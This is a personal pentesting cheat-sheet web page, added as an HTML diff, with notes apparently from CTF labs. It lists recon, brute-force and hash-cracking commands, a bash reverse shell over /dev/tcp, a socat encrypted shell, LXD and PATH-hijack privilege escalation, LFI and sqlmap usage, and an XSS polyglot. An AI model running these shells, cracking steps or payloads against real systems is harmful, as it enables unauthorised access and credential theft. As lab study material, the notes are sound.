@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>aurelstrigac.com</title>
+    <!-- Link to the external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Global Header Navigation -->
+    <header class="top-header">
+        <div class="nav-container">
+            <a href="index.html" class="logo">aurelstrigac.com</a>
+            <nav class="nav-links">
+                <a href="index.html">Home</a>
+                <a href="red_notes.html" class="active">Pentesting Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Two-Panel Layout Container -->
+    <div class="app-container">
+        
+        <!-- Sidebar Navigation -->
+        <aside>
+            <div class="sidebar-header">
+                <input type="text" id="searchInput" class="search-box" placeholder="Search notes..." onkeyup="filterNotes()">
+            </div>
+            <nav class="sidebar-menu">
+                <ul>
+                    <li><a href="#basic-commands">Basic Commands</a></li>
+                    <li><a href="#pivoting-protocols">Pivoting &amp; Protocols</a></li>
+                    <li><a href="#common-tools">Common Tools</a></li>
+                    <li><a href="#enumeration">Enumeration &amp; Recon</a></li>
+                    <li><a href="#cracking">Password Cracking</a></li>
+                    <li><a href="#shells">Shells &amp; Payloads</a></li>
+                    <li><a href="#priv-esc">Privilege Escalation</a></li>
+                    <li><a href="#exploitation">Exploitation</a></li>
+                    <li><a href="#web-vulns">Web Vulnerabilities</a></li>
+                    <li><a href="#definitions">Definitions &amp; Distros</a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <!-- Main Content Area -->
+        <main class="notes-content">
+
+            <!-- Basic Commands -->
+            <section id="basic-commands" class="content-section">
+                <h2>Basic Commands &amp; Protocols</h2>
+                
+                <h3>File Operations &amp; Search</h3>
+                <p>Common commands for finding files and interacting with the system environment.</p>
+                <pre><code># Find file inside a directory, ignoring errors
+find ~ -name "flag.txt" 2&gt;/dev/null
+
+# Find files belonging to a specific user
+find / -user &lt;username&gt; 2&gt;/dev/null
+
+# Locate files using built-in search
+search -f flag.txt</code></pre>
+
+                <h3>SSH, Telnet &amp; FTP</h3>
+                <pre><code># Standard SSH Connection
+ssh &lt;username&gt;@&lt;IP-adr&gt;
+
+# Private Key Connection (Chmod required first)
+chmod 600 id_rsa
+ssh -i id_rsa &lt;username&gt;@&lt;IP-adr&gt;
+
+# Telnet connection
+telnet &lt;IP-adr&gt; [&lt;port-number&gt;] # e.g. POP3: 110, SMB: 445
+
+# FTP connection
+ftp &lt;IP-addr&gt;</code></pre>
+
+                <h3>Data Retrieval &amp; Network Tools</h3>
+                <pre><code># HTTP Request with parameters/headers
+curl -L &lt;url&gt; -H "Cookie: value" -d "user=robert"
+
+# Text searching
+grep "search_term" file_path
+
+# Archiving tools
+unzip &lt;filename&gt;
+7z x &lt;filename&gt;
+
+# DNS and Domain Lookup
+whois &lt;url-addr&gt;
+nslookup -type=A aurelstrigac.com 1.1.1.1
+dig aurelstrigac.com A
+
+# ICMP and Traceroute
+ping -c 4 -s 64 &lt;ip-addr&gt;
+traceroute &lt;ip-addr&gt;</code></pre>
+
+                <h3>Netcat (nc)</h3>
+                <pre><code># Listen Mode
+nc -lvnp &lt;port&gt;
+
+# Connect Mode
+nc &lt;ip-addr&gt; &lt;port&gt;</code></pre>
+
+                <h3>Systemctl</h3>
+                <pre><code># List running services
+systemctl list-units --type=service --state=running
+
+# Investigate service status
+systemctl status &lt;service-name&gt;</code></pre>
+            </section>
+
+            <!-- Pivoting & Protocols -->
+            <section id="pivoting-protocols" class="content-section">
+                <h2>Pivoting on Servers</h2>
+                
+                <h3>POP3 Protocol</h3>
+                <pre><code>USER &lt;username&gt;
+PASS &lt;password&gt;
+LIST        # Lists emails
+RETR &lt;id&gt;   # Retrieves specific email
+QUIT        # Leaves session</code></pre>
+
+                <h3>FTP Protocol</h3>
+                <p>When using the <span class="inline-code">PUT</span> command, ensure the file you intend to upload is in the local active directory from which you initiated the FTP session.</p>
+
+                <h3>SMB Protocol</h3>
+                <pre><code># List available shares without authentication
+smbclient -L //&lt;IP-adr&gt; -N
+
+# Connect to a share with a user
+smbclient //&lt;IP-adr&gt;/&lt;ShareName&gt; -U &lt;username&gt;
+
+# In-session commands
+get &lt;file-name&gt;
+exit</code></pre>
+
+                <h3>HTTP Manual Retrieval</h3>
+                <pre><code>GET /filename HTTP/1.1
+Host: &lt;target_host&gt;</code></pre>
+            </section>
+
+            <!-- Common Tools -->
+            <section id="common-tools" class="content-section">
+                <h2>Common Analysis &amp; Forensics Tools</h2>
+                
+                <h3>Audio Forensics</h3>
+                <pre><code># Create a spectrogram from an audio file
+sox input.wav -n spectrogram -o output.png</code></pre>
+
+                <h3>Steganography</h3>
+                <pre><code># File inspection and header checks
+file &lt;file-name&gt;
+strings input.jpg | tail -n 20
+
+# UPX unpacking (if files are packed)
+upx -d &lt;filename&gt;
+
+# Image metadata and hidden extraction
+exiftool input.jpg
+steghide extract -sf input.jpg
+
+# Automated passphrase cracking on JPGs
+stegseek --crack file.jpg &lt;wordlist-path&gt;
+
+# Hex editor
+hexedit &lt;file-name&gt;
+
+# Extract files from PNG using foremost
+foremost &lt;image.png&gt;</code></pre>
+
+                <h3>Digital Forensics</h3>
+                <pre><code># PDF Metadata
+pdfinfo &lt;file&gt;
+
+# RAM dump analysis framework
+# Volatility is used for system memory analysis</code></pre>
+            </section>
+
+            <!-- Enumeration -->
+            <section id="enumeration" class="content-section">
+                <h2>Enumeration &amp; Reconnaissance</h2>
+                
+                <h3>NMAP</h3>
+                <pre><code># Standard script and version scan
+nmap -sV -sC -oN scan.nmap &lt;IP-adr&gt;
+
+# Other TCP scan types
+nmap -sT &lt;IP-adr&gt; # TCP Connect
+nmap -sS &lt;IP-adr&gt; # SYN Scan (stealthy/fast)
+nmap -sN &lt;IP-adr&gt; # Null Scan (no flags set)
+nmap -sF &lt;IP-adr&gt; # FIN Scan
+nmap -sX &lt;IP-adr&gt; # Xmas Scan (FIN, PSH, URG)
+
+# Discovery and evasion
+nmap -PR -sn 10.10.10.0/24         # ARP scan
+nmap -PE -sn 10.10.10.0/24         # ICMP Echo Request
+nmap -D &lt;decoy1&gt;,&lt;decoy2&gt;,ME &lt;IP&gt;  # Decoy scan</code></pre>
+
+            <h3>Gobuster</h3>
+            <pre><code># Directory search
+gobuster dir -u http://&lt;IP-adr&gt; -w common.txt -r -x php,txt
+
+# VHost search
+gobuster vhost -u "http://&lt;IP-adr&gt;" --domain target.thm -w &lt;wordlist&gt;</code></pre>
+
+                <h3>ffuf</h3>
+                <pre><code># Subdomain discovery
+ffuf -u http://FUZZ.team.thm -w &lt;wordlist&gt; -fs 0 -k
+
+# Username enumeration (post request validation)
+ffuf -w &lt;wordlist&gt; -X POST -d "username=FUZZ&amp;email=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://&lt;IP&gt;/signup -mr "username already exists"
+
+# Password Bruteforce
+ffuf -w valid_users.txt:W1,passwords.txt:W2 -X POST -d "username=W1&amp;password=W2" -u http://&lt;IP&gt;/login -fc 200</code></pre>
+
+                <h3>SMB Shares Enumeration</h3>
+                <pre><code># Active shares scan (enum4linux)
+enum4linux -a &lt;IP-adr&gt;
+
+# SMBMap share enumeration
+smbmap -H &lt;IP-adr&gt;</code></pre>
+            </section>
+
+            <!-- Cracking -->
+            <section id="cracking" class="content-section">
+                <h2>Password Cracking</h2>
+                
+                <h3>Hash Identification</h3>
+                <pre><code>python3 hash-id.py</code></pre>
+
+                <h3>Hydra</h3>
+                <pre><code># Bruteforce SSH
+hydra -l &lt;username&gt; -P rockyou.txt &lt;IP-adr&gt; ssh
+
+# Bruteforce FTP
+hydra -l &lt;username&gt; -P rockyou.txt ftp://&lt;IP-adr&gt;
+
+# Bruteforce Web Forms
+hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;IP-adr&gt; http-post-form "/login:username=^USER^&amp;password=^PASS^:incorrect" -f -V</code></pre>
+
+                <h3>John the Ripper</h3>
+                <pre><code># General cracking
+john --wordlist=rockyou.txt hash.txt
+
+# Extract private key passphrase
+ssh2john.py id_rsa &gt; hash.txt
+john --wordlist=rockyou.txt hash.txt
+
+# Crack /etc/shadow passwords
+unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt
+john --format=sha512crypt --wordlist=rockyou.txt unshadowed.txt
+
+# Zip and Rar files
+zip2john file.zip &gt; hash.txt
+rar2john file.rar &gt; hash.txt
+john --wordlist=rockyou.txt hash.txt</code></pre>
+            </section>
+
+            <!-- Shells & Payloads -->
+            <section id="shells" class="content-section">
+                <h2>Bind &amp; Reverse Shells</h2>
+                
+                <h3>Python Reverse Shell Payload</h3>
+                <pre><code>import os
+os.system('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/&lt;your-IP&gt;/&lt;your-port&gt; 0&gt;&amp;1"')</code></pre>
+
+                <h3>Bypassing Web Upload Restrictions</h3>
+                <ol>
+                    <li>Disable browser Javascript (if processing occurs client-side).</li>
+                    <li>Intercept the request using Burp Suite and manipulate the file extension (e.g., use <span class="inline-code">.phtml</span> or <span class="inline-code">shell.jpg.php</span>).</li>
+                    <li>Prepend image magic bytes (<span class="inline-code">FF D8 FF DB</span> for JPEG) inside a hex editor to spoof server-side inspection.</li>
+                </ol>
+
+                <h3>Shell Stabilization</h3>
+                <pre><code># Upgrade to TTY
+export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Next step: Press Ctrl+Z, run 'stty raw -echo; fg' and hit enter.</code></pre>
+
+                <h3>Socat Encrypted Shells</h3>
+                <pre><code># Create self-signed cert on listener
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
+cat shell.key shell.crt &gt; shell.pem
+
+# Listener Setup
+socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -
+
+# Target Connection Back
+socat OPENSSL:&lt;LHOST&gt;:&lt;LPORT&gt;,verify=0 EXEC:/bin/bash</code></pre>
+            </section>
+
+            <!-- Privilege Escalation -->
+            <section id="priv-esc" class="content-section">
+                <h2>Privilege Escalation</h2>
+                
+                <h3>Sudo Rights &amp; SUID</h3>
+                <pre><code># Check current user's privileges
+sudo -l
+
+# Search for SUID files
+find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
+
+                <h3>LXC / LXD Escalation</h3>
+                <pre><code># Build alpine image on local machine
+git clone https://github.com/saghul/lxd-alpine-builder.git
+sudo ./build-alpine
+
+# Transfer and build container on target
+lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh # Access local filesystem under /mnt/root</code></pre>
+
+                <h3>Path Hijacking</h3>
+                <pre><code># Target executable calls 'cp' relatively instead of using absolute path
+echo '#!/bin/bash' &gt; cp
+echo '/bin/bash' &gt;&gt; cp
+chmod +x cp
+export PATH=$PWD:$PATH</code></pre>
+            </section>
+
+            <!-- Exploitation -->
+            <section id="exploitation" class="content-section">
+                <h2>Exploitation Frameworks</h2>
+                
+                <h3>Metasploit Console</h3>
+                <pre><code># Start framework
+msfconsole
+
+# Search and configure modules
+search type:exploit platform:windows
+use &lt;module-path&gt;
+show payloads
+set payload &lt;payload&gt;
+show options
+exploit -j # Run in background</code></pre>
+
+                <h3>sqlmap</h3>
+                <pre><code># Find databases
+sqlmap -u "http://target.thm/search?cat=1" --dbs
+
+# Extract tables from selected database
+sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; --tables
+
+# Dump tables contents
+sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; -T &lt;table_name&gt; --dump</code></pre>
+            </section>
+
+            <!-- Web Vulnerabilities -->
+            <section id="web-vulns" class="content-section">
+                <h2>Web Application Vulnerabilities</h2>
+                
+                <h3>Insecure Direct Object Reference (IDOR)</h3>
+                <p>Occurs when an application relies directly on user-supplied identifiers without validation.</p>
+                <pre><code>http://online-service.thm/profile?user_id=1001 -&gt; change to 1000</code></pre>
+
+                <h3>File Inclusion (LFI/RFI)</h3>
+                <pre><code># LFI path traversal
+http://target.thm/index.php?file=../../../../etc/passwd
+
+# Read PHP source via filters
+http://target.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/var/www/html/test.php</code></pre>
+
+                <h3>Cross-Site Scripting (XSS)</h3>
+                <ul>
+                    <li><strong>Reflected:</strong> Executed by the client browser via malformed query parameters.</li>
+                    <li><strong>Stored:</strong> Payload is saved directly in target database.</li>
+                    <li><strong>DOM:</strong> DOM environment manipulates the vulnerability client-side.</li>
+                </ul>
+                <p><strong>XSS Polyglot bypass example:</strong></p>
+                <pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</code></pre>
+            </section>
+
+            <!-- Definitions & Distros -->
+            <section id="definitions" class="content-section">
+                <h2>Definitions &amp; System Archetypes</h2>
+                
+                <h3>Common CVSS/VPR Metrics</h3>
+                <ul>
+                    <li><strong>CVSS (Common Vulnerability Scoring System):</strong> Evaluates score severity static across Exploitability, Impact, and CIA Triad elements.</li>
+                    <li><strong>VPR (Vulnerability Priority Rating):</strong> Dynamic score assessing current threat landscape and likelihood of live exploitation.</li>
+                </ul>
+
+                <h3>Specialized Pentesting Distributions</h3>
+                <ul>
+                    <li><strong>Kali Linux:</strong> Platform constructed natively for general penetration testing.</li>
+                    <li><strong>REMnux:</strong> Target VM customized specifically for malware analysis and digital forensics.</li>
+                    <li><strong>FLARE VM:</strong> Windows-based operating system designed for reverse engineering.</li>
+                </ul>
+            </section>
+
+        </main>
+    </div>
+
+    <script>
+        // Section Scroll Tracker (ScrollSpy)
+        document.addEventListener('DOMContentLoaded', () => {
+            const scrollContainer = document.querySelector('main.notes-content');
+            const sections = document.querySelectorAll('.content-section');
+            const navLinks = document.querySelectorAll('.sidebar-menu a');
+
+            if (!scrollContainer || sections.length === 0) return;
+
+            // Configure the observer to watch the scrollable main container
+            const observerOptions = {
+                root: scrollContainer,
+                // Triggers active state when a section is roughly in the lower quarter of page
+                rootMargin: '-10% 0px -35% 0px', 
+                threshold: 0
+            };
+
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const id = entry.target.getAttribute('id');
+                        navLinks.forEach(link => {
+                            if (link.getAttribute('href') === `#${id}`) {
+                                link.classList.add('active');
+                            } else {
+                                link.classList.remove('active');
+                            }
+                        });
+                    }
+                });
+            }, observerOptions);
+
+            sections.forEach(section => observer.observe(section));
+        });
+
+        // Notes Search
+        function filterNotes() {
+            let input = document.getElementById('searchInput').value.toLowerCase();
+            let sections = document.querySelectorAll('.content-section');
+            
+            sections.forEach(section => {
+                let text = section.innerText.toLowerCase();
+                if (text.includes(input)) {
+                    section.style.display = "";
+                } else {
+                    section.style.display = "none";
+                }
+            });
+        }
+    </script>
+</body>
+</html>
